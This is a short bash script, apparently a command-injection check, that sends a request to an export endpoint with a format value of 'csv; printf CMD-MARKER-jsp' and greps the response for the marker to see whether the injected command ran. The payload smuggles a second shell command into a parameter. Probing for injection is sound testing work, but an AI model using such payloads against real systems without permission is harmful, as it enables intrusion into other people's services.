#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -sG "$TARGET/export" --data-urlencode 'format=csv; printf CMD-MARKER-jsp' | grep -F 'CMD-MARKER-jsp'
